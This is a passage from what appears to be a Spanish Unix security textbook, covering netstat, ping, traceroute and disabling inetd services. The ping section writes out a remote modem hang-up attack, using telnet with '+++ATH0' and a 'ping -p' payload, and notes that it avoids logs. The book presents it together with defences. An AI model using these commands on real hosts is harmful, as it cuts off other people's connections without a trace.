&#x00A0;localhost.32879&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;TIME&#x005F;WAIT
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;IDLE
&#x00A0;anita:/#
</literallayout>
<!--l. 540--><para>Por un lado, en este caso vemos que hay bastantes puertos abiertos, esto es, escuchando peticiones: todos los
que presentan un estado LISTEN, como telnet, finger o smtp (si es un servicio con nombre en
/etc/services se imprimir&#x00E1; este nombre, y si no simplemente el n&#x00FA;mero de puerto). Cualquiera puede
conectar a este servicio (como veremos en el siguiente punto) y, si no lo evitamos mediante TCP Wrappers,
utilizarlo para enviarle peticiones.
<!--br/-->
<!--br/-->Aparte de estos puertos a la espera de conexiones, vemos otro gran n&#x00FA;mero de conexiones establecida
entre nuestro sistema y otros (como antes hemos dicho, desde nuestro equipo o hacia &#x00E9;l); casi
todas las establecidas (estado ESTABLISHED) son de nuestra m&#x00E1;quina contra ella misma, lo que
a priori no implica consecuencias de seguridad. Otra de ellas es desde un equipo de la red
local contra nuestro sistema, lo que tambi&#x00E9;n es bastante normal y no debe hacernos sospechar
nada <anchor 
   id="x1-200001f4"  ></anchor><footnote><para>     Seguramente, uno de nuestros usuarios estar&#x00E1; trabajando desde ese ordenador, aunque tambi&#x00E9;n podr&#x02CA;&#x0131;a tratarse de un
atacante&#x2026;</para></footnote>;
sin embargo, hay una conexi&#x00F3;n que s&#x02CA;&#x0131; puede indicar que alguien ha accedido a nuestro sistema de forma no
autorizada: si nos &#xFB01;jamos, alguien conecta por telnet desde la m&#x00E1;quina bgates.microsoft.com. Es

raro que tengamos a un usuario all&#x02CA;&#x0131;, por lo que deber&#x02CA;&#x0131;amos monitorizar esta conexi&#x00F3;n y las
actividades que esta persona realice; es muy probable que se trate de alguien que ha aprovechado la
inseguridad de ciertos sistemas para utilizarlos como plataforma de ataque contra nuestros
Unix.
  </para></section><!--end subsection--><!--l. 564--><section 
role="subsection"><title><abbrev role="title-mark">13.3.4</abbrev><anchor 
   id="x1-20100013.3.4"  ></anchor>La orden ping</title>
<!--l. 565--><para>  El comando ping se utiliza generalmente para testear aspectos de la red, como comprobar que un
sistema est&#x00E1; encendido y conectado; esto se consigue enviando a dicha m&#x00E1;quina paquetes ICMP
(de tipo ECHO<informalequation><graphic 
fileref="unixsec283x.gif"></graphic></informalequation>REQUEST), tramas que causar&#x00E1;n que el n&#x00FA;cleo del sistema remoto responda con
paquetes ICMP, pero esta vez de tipo ECHO<informalequation><graphic 
fileref="unixsec284x.gif"></graphic></informalequation>RESPONSE. Al recibirlos, se asume que la m&#x00E1;quina est&#x00E1;
encendida:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;ping&#x00A0;luisa
&#x00A0;luisa&#x00A0;is&#x00A0;alive
&#x00A0;anita:~#
</literallayout>
<!--l. 579--><para>En otras variantes de Unix (el ejemplo anterior es sobre Solaris) la orden ping produce un resultado con m&#x00E1;s
informaci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ping&#x00A0;-c&#x00A0;1&#x00A0;anita
&#x00A0;PING&#x00A0;anita&#x00A0;(192.168.0.3):&#x00A0;56&#x00A0;data&#x00A0;bytes
&#x00A0;64&#x00A0;bytes&#x00A0;from&#x00A0;192.168.0.3:&#x00A0;icmp&#x005F;seq=0&#x00A0;ttl=255&#x00A0;time=0.2&#x00A0;ms
&#x00A0;
&#x00A0;---&#x00A0;luisa&#x00A0;ping&#x00A0;statistics&#x00A0;---
&#x00A0;1&#x00A0;packets&#x00A0;transmitted,&#x00A0;1&#x00A0;packets&#x00A0;received,&#x00A0;0%&#x00A0;packet&#x00A0;loss
&#x00A0;round-trip&#x00A0;min/avg/max&#x00A0;=&#x00A0;0.2/0.2/0.2&#x00A0;ms
&#x00A0;luisa:~#
</literallayout>
<!--l. 593--><para>Aunque un simple ping resulta inofensivo en la mayor&#x02CA;&#x0131;a de situaciones, existen casos en los que se puede
utilizar como un arma &#x2013; efectiva &#x2013; para atacar sistemas; por ejemplo, uno de los ataques m&#x00E1;s conocidos es
el Ping Flood, consistente en saturar una l&#x02CA;&#x0131;nea lenta con un n&#x00FA;mero de paquetes ICMP su&#xFB01;cientemente
grande. Esta saturaci&#x00F3;n causar&#x00E1; una degradaci&#x00F3;n del servicio importante, incluso la desconexi&#x00F3;n del sistema si
se ataca una l&#x02CA;&#x0131;nea telef&#x00F3;nica (un objetivo muy habitual para los piratas). En este &#x00FA;ltimo caso, el de
conexiones telef&#x00F3;nicas, otro ataque com&#x00FA;n &#x2013; no directamente relacionado con ping, pero en el
que se usa esta herramienta como base &#x2013; consiste en enviar una trama &#x2018;especial&#x2019; a un m&#x00F3;dem,
oblig&#x00E1;ndole a &#xFB01;nalizar la llamada: los m&#x00F3;dems conmutan a modo comando cuando reciben la orden
&#x2018;+++&#x2019;, y muchos de ellos lo hacen tambi&#x00E9;n al recibir remotamente esta secuencia de control. As&#x02CA;&#x0131;,
podemos conectar a un puerto donde se ofrezca determinado servicio (como FTP o SMTP)
en un host con un m&#x00F3;dem de estas caracter&#x02CA;&#x0131;sticas y colgar el m&#x00F3;dem remoto sin levantarnos
de la silla, simplemente enviando la cadena &#x2018;+++&#x2019; seguida de una orden de colgado como
&#x2018;ATH0&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;XXX.XXX.X.XX&#x00A0;21
&#x00A0;Trying&#x00A0;XXX.XXX.X.XX...
&#x00A0;Connected&#x00A0;to&#x00A0;XXX.XXX.X.XX.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;gema&#x00A0;FTP&#x00A0;server&#x00A0;(Version&#x00A0;wu-2.4.2-academ[BETA-15](1)&#x00A0;Fri&#x00A0;Oct&#x00A0;22
&#x00A0;00:38:20&#x00A0;CDT&#x00A0;1999)&#x00A0;ready.
&#x00A0;USER&#x00A0;+++ATH0
&#x00A0;&#x02C6;]
&#x00A0;telnet&#x003E;&#x00A0;close
&#x00A0;Connection&#x00A0;closed.
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;XXX.XXX.X.XX
&#x00A0;Trying&#x00A0;XXX.XXX.X.XX...
&#x00A0;telnet:&#x00A0;Unable&#x00A0;to&#x00A0;connect&#x00A0;to&#x00A0;remote&#x00A0;host:&#x00A0;Network&#x00A0;is&#x00A0;unreachable
&#x00A0;luisa:~#
</literallayout>
<!--l. 630--><para>Bien pero, &#x00BF;d&#x00F3;nde entra ping en este ataque? Muy sencillo: al conectar a un servicio para enviar la cadena de
caracteres, lo habitual es que el sistema remoto registre la conexi&#x00F3;n, aunque luego su m&#x00F3;dem cuelgue. En
cambio, muy pocos sistemas registran en los logs un simple ping, por lo que esta orden se convierte en un
mecanismo que algunos piratas utilizan para no dejar rastro de sus acciones; esto se consigue de una forma
muy sencilla: en la utilidad ping de la mayor&#x02CA;&#x0131;a de Unices existe un par&#x00E1;metro que permite
especi&#xFB01;car el contenido del paquete enviado (por ejemplo, &#x2018;-p&#x2019; en Linux), por lo que simplemente
hemos de insertar (en hexadecimal) la cadena &#x2018;+++ATH0&#x2019; en la trama que enviamos al sistema
remoto:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ping&#x00A0;-c&#x00A0;1&#x00A0;XXX.XXX.X.XX
&#x00A0;PING&#x00A0;XXX.XXX.X.XX&#x00A0;(XXX.XXX.X.XX):&#x00A0;56&#x00A0;data&#x00A0;bytes
&#x00A0;64&#x00A0;bytes&#x00A0;from&#x00A0;XXX.XXX.X.XX:&#x00A0;icmp&#x005F;seq=0&#x00A0;ttl=255&#x00A0;time=0.2&#x00A0;ms
&#x00A0;
&#x00A0;---&#x00A0;XXX.XXX.X.XX&#x00A0;ping&#x00A0;statistics&#x00A0;---
&#x00A0;1&#x00A0;packets&#x00A0;transmitted,&#x00A0;1&#x00A0;packets&#x00A0;received,&#x00A0;0%&#x00A0;packet&#x00A0;loss
&#x00A0;round-trip&#x00A0;min/avg/max&#x00A0;=&#x00A0;6.5/6.5/6.5&#x00A0;ms
&#x00A0;luisa:~#&#x00A0;ping&#x00A0;-p&#x00A0;2b2b2b415448300d&#x00A0;XXX.XXX.X.XX
&#x00A0;PING&#x00A0;XXX.XXX.X.XX&#x00A0;(XXX.XXX.X.XX):&#x00A0;56&#x00A0;data&#x00A0;bytes
&#x00A0;
&#x00A0;&#x02C6;C
&#x00A0;---&#x00A0;XXX.XXX.X.XX&#x00A0;ping&#x00A0;statistics&#x00A0;---
&#x00A0;1&#x00A0;packets&#x00A0;transmitted,&#x00A0;0&#x00A0;packets&#x00A0;received,&#x00A0;100%&#x00A0;packet&#x00A0;loss
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;XXX.XXX.X.XX
&#x00A0;Trying&#x00A0;XXX.XXX.X.XX...
&#x00A0;telnet:&#x00A0;Unable&#x00A0;to&#x00A0;connect&#x00A0;to&#x00A0;remote&#x00A0;host:&#x00A0;Network&#x00A0;is&#x00A0;unreachable
&#x00A0;luisa:~#
</literallayout>
<!--l. 662--><para>Para evitar los problemas relacionados con los paquetes ICMP que sistemas remotos puedan enviar a nuestra
m&#x00E1;quina puede ser conveniente &#xFB01;ltrar dicho protocolo mediante un cortafuegos (incluso situado en el propio
equipo); si no tenemos esta posibilidad, al menos es interesante registrar las tramas de este tipo que
llegan hasta nuestra m&#x00E1;quina, con programas como icmpinfo (si hacemos esto, hemos de tener
cuidado con las negaciones de servicio ocasionadas por una cantidad de logs excesiva en el disco
duro).
<!--br/-->
<!--br/-->Ah, si es nuestro m&#x00F3;dem el que presenta el problema que acabamos de comentar, podemos solucionarlo
mediante la cadena de inicializaci&#x00F3;n &#x2018;s2=255&#x2019;.
  </para></section><!--end subsection--><!--l. 673--><section 
role="subsection"><title><abbrev role="title-mark">13.3.5</abbrev><anchor 
   id="x1-20200013.3.5"  ></anchor>La orden traceroute</title>
<!--l. 674--><para>  Esta orden se utiliza para imprimir la ruta que los paquetes siguen desde nuestro sistema hasta otra
m&#x00E1;quina; para ello utiliza el campo TTL (Time To Live) del protocolo IP, inicializ&#x00E1;ndolo con valores bajos y
aument&#x00E1;ndolo conforme va recibiendo tramas ICMP de tipo TIME<informalequation><graphic 
fileref="unixsec285x.gif"></graphic></informalequation>EXCEEDED. La idea es sencilla: cada
vez que un paquete pasa por un router o una pasarela, esta se encarga de decrementar el
campo TTL en una unidad; en el caso de que se alcance un valor 0, se devuelve un paquete
TIME<informalequation><graphic 
fileref="unixsec286x.gif"></graphic></informalequation>EXCEEDED y se descarta la trama. As&#x02CA;&#x0131;, traceroute inicializa a 1 este campo, lo que ocasiona
que el primer router encontrado ya devuelva el mensaje de error; al recibirlo, lo inicializa
a 2, y ahora es el segundo router el que descarta el paquete y env&#x02CA;&#x0131;a otro mensaje de error,
y as&#x02CA;&#x0131; sucesivamente. De esta forma se va construyendo la ruta hasta un determinado host
remoto:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;traceroute&#x00A0;www.altavista.com
&#x00A0;traceroute&#x00A0;to&#x00A0;altavista.com&#x00A0;(204.152.190.70),&#x00A0;30&#x00A0;hops&#x00A0;max,&#x00A0;40&#x00A0;byte&#x00A0;packets
&#x00A0;&#x00A0;1&#x00A0;&#x00A0;annex4.net.upv.es&#x00A0;(158.42.240.191)&#x00A0;&#x00A0;156.251&#x00A0;ms&#x00A0;&#x00A0;144.468&#x00A0;ms&#x00A0;&#x00A0;139.855&#x00A0;ms
&#x00A0;&#x00A0;2&#x00A0;&#x00A0;zaurac-r.net.upv.es&#x00A0;(158.42.240.250)&#x00A0;&#x00A0;159.784&#x00A0;ms&#x00A0;&#x00A0;149.734&#x00A0;ms&#x00A0;&#x00A0;149.809&#x00A0;ms
&#x00A0;&#x00A0;3&#x00A0;&#x00A0;atlas.cc.upv.es&#x00A0;(158.42.1.10)&#x00A0;&#x00A0;149.881&#x00A0;ms&#x00A0;&#x00A0;149.717&#x00A0;ms&#x00A0;&#x00A0;139.853&#x00A0;ms
&#x00A0;&#x00A0;4&#x00A0;&#x00A0;A1-0-3.EB-Valencia1.red.rediris.es&#x00A0;(130.206.211.185)&#x00A0;&#x00A0;149.863&#x00A0;ms
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;150.088&#x00A0;ms&#x00A0;&#x00A0;149.523&#x00A0;ms
&#x00A0;&#x00A0;5&#x00A0;&#x00A0;A0-1-2.EB-Madrid00.red.rediris.es&#x00A0;(130.206.224.5)&#x00A0;&#x00A0;189.749&#x00A0;ms
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;159.698&#x00A0;ms&#x00A0;&#x00A0;180.138&#x00A0;ms
&#x00A0;&#x00A0;6&#x00A0;&#x00A0;A6-0-0-1.EB-Madrid0.red.rediris.es&#x00A0;(130.206.224.74)&#x00A0;&#x00A0;179.518&#x00A0;ms
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;159.678&#x00A0;ms&#x00A0;&#x00A0;189.897&#x00A0;ms
&#x00A0;&#x00A0;7&#x00A0;&#x00A0;194.69.226.13&#x00A0;(194.69.226.13)&#x00A0;&#x00A0;259.752&#x00A0;ms&#x00A0;&#x00A0;249.664&#x00A0;ms&#x00A0;&#x00A0;259.83&#x00A0;ms
&#x00A0;&#x00A0;8&#x00A0;&#x00A0;*&#x00A0;*&#x00A0;195.219.101.1&#x00A0;(195.219.101.1)&#x00A0;&#x00A0;290.772&#x00A0;ms
&#x00A0;&#x00A0;9&#x00A0;&#x00A0;195.219.96.34&#x00A0;(195.219.96.34)&#x00A0;&#x00A0;1680.33&#x00A0;ms&#x00A0;&#x00A0;1660.36&#x00A0;ms&#x00A0;&#x00A0;1669.83&#x00A0;ms
&#x00A0;10&#x00A0;&#x00A0;*&#x00A0;195.66.225.76&#x00A0;(195.66.225.76)&#x00A0;&#x00A0;1660.68&#x00A0;ms&#x00A0;&#x00A0;1650.33&#x00A0;ms
&#x00A0;11&#x00A0;&#x00A0;core1-linx-oc3-1.lhr.above.net&#x00A0;(216.200.254.81)&#x00A0;&#x00A0;2009.88&#x00A0;ms&#x00A0;&#x00A0;1970.32&#x00A0;ms&#x00A0;*
&#x00A0;12&#x00A0;&#x00A0;iad-lhr-stm4.iad.above.net&#x00A0;(216.200.254.77)&#x00A0;&#x00A0;2050.68&#x00A0;ms&#x00A0;*&#x00A0;*
&#x00A0;13&#x00A0;&#x00A0;sjc-iad-oc12-2.sjc.above.net&#x00A0;(216.200.0.22)&#x00A0;&#x00A0;2440.89&#x00A0;ms&#x00A0;&#x00A0;2170.29&#x00A0;ms
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2579.81&#x00A0;ms
&#x00A0;14&#x00A0;&#x00A0;pao-sjc-oc12-2.pao.above.net&#x00A0;(207.126.96.65)&#x00A0;&#x00A0;2441.19&#x00A0;ms&#x00A0;&#x00A0;2140.32&#x00A0;ms&#x00A0;*
&#x00A0;15&#x00A0;&#x00A0;mibh-above-oc3.pao.mibh.net&#x00A0;(216.200.0.10)&#x00A0;&#x00A0;2200.57&#x00A0;ms&#x00A0;*&#x00A0;*
&#x00A0;16&#x00A0;&#x00A0;*&#x00A0;*&#x00A0;www.altavista.com&#x00A0;(204.152.190.70)&#x00A0;&#x00A0;1810.56&#x00A0;ms
&#x00A0;luisa:~#
</literallayout>
<!--l. 714--><para>traceroute se utiliza para realizar pruebas, medidas y administraci&#x00F3;n de una red; introduce mucha
sobrecarga, lo que evidentemente puede acarrear problemas de rendimiento, llegando incluso a negaciones
de servicio por el elevado tiempo de respuesta que el resto de aplicaciones de red pueden presentar.
Adem&#x00E1;s, se trata de un programa contenido en un &#xFB01;chero setuidado, por lo que es interesante resetear el bit
de setuid de forma que s&#x00F3;lo el root pueda ejecutar la orden: hemos de pensar que un usuario normal
rara vez tiene que realizar pruebas sobre la red, por lo que el bit setuid de traceroute no es
m&#x00E1;s que un posible problema para nuestra seguridad; aunque con ping sucede lo mismo (es
un &#xFB01;chero setuidado), que un usuario necesite ejecutar traceroute es menos habitual que
que necesite ejecutar ping (de cualquier forma, tambi&#x00E9;n podr&#x02CA;&#x0131;amos resetear el bit setuid de
ping).
  </para></section><!--end subsection--></section><!--end section--><!--l. 727--><section 
role="section"><title><abbrev role="title-mark">13.4</abbrev><anchor 
   id="x1-20300013.4"  ></anchor>Servicios</title>
<!--l. 729--><para>  Los servicios ofrecidos por una m&#x00E1;quina al resto suelen ser uno de los principales puntos de
ataque contra esa m&#x00E1;quina; estos ataques pueden implicar desde negaciones de servicio (DoS,
Denial of Service) m&#x00E1;s o menos graves hasta un acceso root remoto sin necesidad de ninguna
clave.
<!--br/-->
<!--br/-->Hay dos formas b&#x00E1;sicas de ofrecer un servicio: o mediante inetd, o bien lanzando un demonio que se asocia
y escucha en cierto puerto, generalmente en el arranque del sistema. Por norma general se recomienda
ofrecer el m&#x02CA;&#x0131;nimo n&#x00FA;mero de servicios; incluso si hay alg&#x00FA;n servicio que no sabemos para qu&#x00E9; se utiliza, lo
mejor para nuestra seguridad ser&#x02CA;&#x0131;a dejar de ofrecerlo.
<!--br/-->
<!--br/-->Dejar de ofrecer cierto servicio en m&#x00E1;quinas Unix es muy sencillo; no necesitamos reiniciar el sistema para
que los cambios tengan efecto ni nada por el estilo: con un simple editor de textos podemos limitar los
servicios ofrecidos. En el caso de servicios ofertados a trav&#x00E9;s de inetd, no tenemos m&#x00E1;s que editar
/etc/inetd.conf y comentar las l&#x02CA;&#x0131;neas correspondientes a los servicios a cerrar (los comentarios en
&#xFB01;cheros de con&#xFB01;guraci&#x00F3;n de Unix suelen ser lineales, utilizando el s&#x02CA;&#x0131;mbolo #). Despu&#x00E9;s de comentar las l&#x02CA;&#x0131;neas

correspondientes hemos de reiniciar el demonio inetd envi&#x00E1;ndole la se~nal SIGHUP (con &#x00F3;rdenes como kill,
pkill o killall). En el caso de demonios independientes lanzados durante el arranque del
sistema no tenemos m&#x00E1;s que enviarles la se~nal SIGTERM (por norma general, aunque en algunos
casos quiz&#x00E1;s es necesaria SIGKILL), y tambi&#x00E9;n editar los &#xFB01;cheros que lanzen estos demonios y
comentar las l&#x02CA;&#x0131;neas encargadas de la inicializaci&#x00F3;n, para que no se vuelvan a lanzar la pr&#x00F3;xima vez
que la m&#x00E1;quina arranque; generalmente se tratar&#x00E1; de archivos situados en /etc/rc.d/ o en
/etc/rc?.d/.
<!--br/-->
<!--br/-->Veamos un ejemplo: imaginemos que en nuestro /etc/inetd.conf tenemos la l&#x02CA;&#x0131;nea del servicio de telnet
que hemos mostrado anteriormente. En este caso, si alguien ejecuta un telnet a nuestro sistema, ver&#x00E1; algo
parecido a esto:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~$&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;SunOS&#x00A0;5.7
&#x00A0;
&#x00A0;login:
</literallayout>
<!--l. 773--><para>Si esta l&#x02CA;&#x0131;nea de /etc/inetd.conf la sustituimos por

     </para><literallayout role="verbatim">
&#x00A0;#telnet&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/in.telnetd
</literallayout>
<!--l. 781--><para>y a continuaci&#x00F3;n ejecutamos pkill -HUP inetd, cuando alguien haga un telnet a nuestra m&#x00E1;quina ver&#x00E1;
esto:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~$&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;telnet:&#x00A0;Unable&#x00A0;to&#x00A0;connect&#x00A0;to&#x00A0;remote&#x00A0;host:&#x00A0;Connection&#x00A0;refused
&#x00A0;rosita:~$
</literallayout>
<!--l. 793--><para>Demonios t&#x02CA;&#x0131;picos que se lanzan desde inetd son in.telnetd (para recibir peticiones telnet), in.ftpd
(para peticiones ftp), in.talkd (para peticiones talk), in.fingerd (para finger remoto) o in.r<informalequation><graphic 
fileref="unixsec287x.gif"></graphic></informalequation>, para
los servicios r-<informalequation><graphic 
fileref="unixsec288x.gif"></graphic></informalequation> de Unix BSD. Demonios que se suelen lanzar en el arranque del sistema son
sendmail (gesti&#x00F3;n de correo electr&#x00F3;nico), httpd (servicio http), lpd (demonio de impresi&#x00F3;n), inetd
(recordemos que es un demonio que tambi&#x00E9;n se ha de iniciar en el arranque) o nfsd (para compartir
sistemas de &#xFB01;cheros mediante NFS); algunos de estos conviene servirlos desde inetd en lugar de
como demonios independientes, por motivos de seguridad que ya veremos al hablar de TCP
Wrappers.
<!--br/-->
<!--br/-->Hasta ahora hemos hablado de dos formas de ofrecer un servicio: o bien a trav&#x00E9;s de inetd, o bien como
demonio independiente lanzado al arrancar el sistema; realmente, existe una tercera forma de ofrecer
servicios, y es el mecanismo RPC (Remote Procedure Call), original de Sun Microsystems pero que en la
actualidad est&#x00E1; implementado tambi&#x00E9;n por OSF (Open Software Foundation) en su DCE (Distributed
Computing Environment) y por OMG (Open Management Group) en CORBA (Common Object
Request Broker Architecture). La idea b&#x00E1;sica del funcionamiento de RPC es sencilla: existe un
programa denominado portmap, rpcbind, rpc.portmap&#x2026;(su nombre depende del clon de Unix
utilizado) que los servidores RPC utilizan para registrarse. As&#x02CA;&#x0131;, cuando un cliente desea utilizar
esos servicios, en lugar de conectar a un puerto determinado donde se encuentre el servidor
lo hace al puerto del portmapper, que le indicar&#x00E1; la ubicaci&#x00F3;n exacta del servidor solicitado.
Como estos mecanismos pueden llegar a ser muy complejos no vamos a entrar en detalles de su
seguridad; s&#x00F3;lo decir que existe una versi&#x00F3;n de portmap desarrollada por Wietse Venema que utiliza
un control de accesos similar a TCP Wrappers, lo que evidentemente va a ser muy &#x00FA;til para
nuestra seguridad: s&#x00F3;lo permitiremos conexiones RPC a los sistemas deseados, denegando el
acceso al resto. M&#x00E1;s detalles de la seguridad de RPC pueden encontrarse en el cap&#x02CA;&#x0131;tulo 19 de
<citation>[?]</citation>.
<!--br/-->
<!--br/-->Cada puerto abierto en nuestro sistema representa una puerta de entrada al mismo, por lo que como
hemos dicho, hemos de minimizar su n&#x00FA;mero ofreciendo s&#x00F3;lo los servicios estrictamente necesarios. Por
ejemplo, si ofrecemos el servicio telnet, cualquier persona, desde cualquier parte del mundo, podr&#x00E1; acceder
a nuestra m&#x00E1;quina simplemente conociendo (o adivinando) un nombre de usuario y su clave; si
ofrecemos el servicio netstat, cualquiera podr&#x00E1; consultar las conexiones activas de nuestra red
simplemente tecleando telnet maquina.dominio.com netstat, desde cualquier ordenador
conectado a la red. Pero no s&#x00F3;lo nos tenemos que limitar a cerrar servicios: hay algunos que, como
administradores de un sistema, no vamos a tener m&#x00E1;s remedio que ofrecer; en este caso es casi obligatorio
restringir su disponibilidad a un n&#x00FA;mero de m&#x00E1;quinas determinado, como veremos al hablar de TCP
Wrappers, y por supuesto utilizar la &#x00FA;ltima versi&#x00F3;n de los demonios encargados de procesar
las peticiones: un demonio no es m&#x00E1;s que un programa, y por supuesto es muy dif&#x02CA;&#x0131;cil que est&#x00E9;
completamente libre de errores. Un error en el demonio que utilicemos para procesar una petici&#x00F3;n puede
comprometer la seguridad de todo nuestro sistema, por lo que se recomienda estar atento a listas
de seguridad (como BUGTRAQ o CERT) en las que se difundan problemas de seguridad y sus
soluciones.



</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-20400014"  ></anchor>Algunos servicios y protocolos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">14.1</abbrev><anchor 
   id="x1-20500014.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  En este cap&#x02CA;&#x0131;tulo vamos a hablar de la seguridad (e inseguridad) de algunos de los protocolos, servicios y
programas que los implementan en los entornos Unix. No vamos a entrar en detalles sobre el
funcionamiento de cada uno de ellos, ya que ese ser&#x02CA;&#x0131;a un trabajo que exceder&#x02CA;&#x0131;a los objetivos de este
proyecto; para m&#x00E1;s referencias se puede consultar <citation>[?]</citation> (detalles de la implementaci&#x00F3;n interna de algunos
servicios) o <citation>[?]</citation>.
<!--br/-->
<!--br/-->Podemos ver los diferentes servicios que un sistema Unix ofrece como potenciales puertas de entrada al
mismo, o al menos como fuentes de ataques que ni siquiera tienen por qu&#x00E9; proporcionar acceso a la m&#x00E1;quina
&#x2013; como las negaciones de servicio &#x2013;. De esta forma, si cada servicio ofrecido es un posible problema para
nuestra seguridad, parece claro que lo ideal ser&#x02CA;&#x0131;a no ofrecer ninguno, poseer una m&#x00E1;quina completamente
aislada del resto; evidentemente, esto no suele ser posible hoy en d&#x02CA;&#x0131;a en la mayor parte de los
sistemas <anchor 
   id="x1-205001f1"  ></anchor><footnote><para>     No obstante, algunos equipos que no necesitan estar conectados entre s&#x02CA;&#x0131;, lo est&#x00E1;n; cada administrador deber&#x02CA;&#x0131;a preguntarse
si realmente necesita sus m&#x00E1;quinas conectadas a la red.</para></footnote>.
Por tanto, ya que es necesaria la conectividad entre equipos, hemos de ofrecer los m&#x02CA;&#x0131;nimos servicios
necesarios para que todo funcione correctamente; esto choca frontalmente con las pol&#x02CA;&#x0131;ticas de la mayor&#x02CA;&#x0131;a
de fabricantes de sistemas Unix, que por defecto mantienen la mayor&#x02CA;&#x0131;a de servicios abiertos al instalar un
equipo nuevo: es responsabilidad del administrador preocuparse de cerrar los que no sean estrictamente
necesarios.
<!--br/-->
<!--br/-->T&#x02CA;&#x0131;picos ejemplos de servicios que suele ser necesario ofrecer son telnet o ftp; en estos casos no se puede
aplicar el esquema todo o nada que vimos al estudiar el sistema de red de Unix, donde o bien ofrec&#x02CA;&#x0131;amos
un servicio o lo deneg&#x00E1;bamos completamente: es necesaria una correcta con&#xFB01;guraci&#x00F3;n para que s&#x00F3;lo sea
posible acceder a ellos desde ciertas m&#x00E1;quinas, como veremos al hablar de TCP Wrappers.
Tambi&#x00E9;n es una buena idea sustituir estos servicios por equivalentes cifrados, como la familia de
aplicaciones SSH, y concienciar a los usuarios para que utilicen estos equivalentes: hemos de recordar
siempre &#x2013; y recordar a los usuarios &#x2013; que cualquier conexi&#x00F3;n en texto claro entre dos sistemas
puede ser f&#x00E1;cilmente capturada por cualquier persona situada en una m&#x00E1;quina intermedia, con lo
simplemente utilizando telnet estamos poniendo en juego la seguridad de sistemas y redes
completas.
<!--br/-->
<!--br/-->Aparte de puertas de entrada, los servicios ofrecidos tambi&#x00E9;n son muy susceptibles de ataques de negaci&#x00F3;n
de servicio (DoS), por ejemplo por demasiadas conexiones abiertas simult&#x00E1;neamente en una
misma m&#x00E1;quina; incluso es posible que uno de estos ataques contra cierto servicio inutilice
completamente a inetd, de forma que todos los ofrecidos desde &#x00E9;l quedan bloqueados hasta que el
demonio se reinicia. Este problema incluso puede ser muy grave: imaginemos que &#x2013; por cualquier
motivo &#x2013; inetd deja de responder peticiones; si esto sucede es posible que ni siquiera podamos
acceder a la m&#x00E1;quina remotamente para solucionar el problema (por ejemplo telnet o incluso
SSH si lo servimos deste inetd dejar&#x02CA;&#x0131;an de funcionar). Para evitar este problema, muchos
administradores plani&#xFB01;can una tarea que se ejecute cada pocos minutos mediante cron, y que
simplemente env&#x02CA;&#x0131;e la se~nal SIGHUP a inetd, por ejemplo a~nadiendo esta entrada a su &#xFB01;chero
crontab <anchor 
   id="x1-205002f2"  ></anchor><footnote><para>    Es recomendable consultar la sintaxis de estos &#xFB01;cheros en el clon de Unix en que trabajemos, ya que puede variar entre
diferentes Unices.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;killall&#x00A0;-HUP&#x00A0;inetd
</literallayout>
<!--l. 60--><para>Si en nuestro clon de Unix no disponemos de una &#x00F3;rden para enviar se~nales a los procesos en funci&#x00F3;n de su
nombre (como pkill en Solaris o killall en Linux o IRIX) podemos utilizar un poco de programaci&#x00F3;n
shellscript para conseguirlo:

     </para><literallayout role="verbatim">
